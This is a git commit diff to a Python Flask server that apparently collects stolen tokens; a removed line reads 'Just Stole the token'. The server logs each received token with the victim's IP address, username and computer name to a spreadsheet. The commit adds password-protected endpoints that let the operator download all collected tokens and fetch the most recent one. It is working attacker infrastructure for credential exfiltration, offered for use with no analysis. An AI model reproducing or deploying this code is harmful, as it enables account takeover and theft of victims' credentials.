ec6828acf9d20df3c407a7d41c2b9a9fe6680326
Peleg <45825608+pkd2210@users.noreply.github.com>
2025-07-26 01:28:21 +0300

    added /download, /lastcode, and /setypassword

--- server.py
+++ server.py
@@ -1,7 +1,9 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file
 from openpyxl import Workbook, load_workbook
 import os
 from datetime import datetime
+
+password = "SuperSecretPassword"
 
 app = Flask(__name__)
 
@@ -27,12 +29,48 @@ def index():
         ws.cell(row=row, column=3, value=request.remote_addr)
         ws.cell(row=row, column=4, value=username)
         ws.cell(row=row, column=5, value=computer)
-        
+
         wb.save(file)
-        print("Just Stole the token: " + content)
+        print("New token: " + content + " " + username + " " + computer + " " + request.remote_addr)
         return jsonify({"message": "success"})
     else:
         return jsonify({"message": "error"})
 
+@app.route('/download', methods=['GET'])
+def download():
+    if request.args.get('password') != password:
+        return jsonify({"message": "Unauthorized, use http://url/download?password=adminpassword"}), 401
+    else:
+        if not os.path.exists('tokens.xlsx'):
+            return jsonify({"message": "File Not Exists"})
+        return send_file('tokens.xlsx', as_attachment=True)
+
+@app.route('/lastcode', methods=['GET'])
+def last_code():
+    if request.args.get('password') != password:
+        return jsonify({"message": "Unauthorized, use http://url/lastcode?password=adminpassword"}), 401
+    else:
+        if os.path.exists('tokens.xlsx'):
+            wb = load_workbook('tokens.xlsx')
+            ws = wb.active
+            lastRow = ws.max_row
+            lastCode = ws.cell(row=lastRow, column=2).value
+            lastCodeIP = ws.cell(row=lastRow, column=3).value
+            lastCodeUsername = ws.cell(row=lastRow, column=4).value
+            lastCodeComputer = ws.cell(row=lastRow, column=5).value
+            return jsonify({ "lastCode": lastCode, "lastCodeIP": lastCodeIP, "lastCodeUsername": lastCodeUsername, "lastCodeComputer": lastCodeComputer })
+        else:
+            return jsonify({"message": "File Not Exists"}), 404
+        
+@app.route('/setpassword', methods=['GET'])
+def set_password():
+    global password
+    if request.args.get('password') != password:
+        return jsonify({"message": "Unauthorized, use http://url/setpassword?password=adminpassword&newpassword=yournewpassword"}), 401
+    else:
+        new_password = request.args.get('newpassword')
+        if new_password:
+            password = new_password
+            return jsonify({"message": "Successfully changed your password"}), 200
 if __name__ == '__main__':
     app.run(debug=False, port=5001)
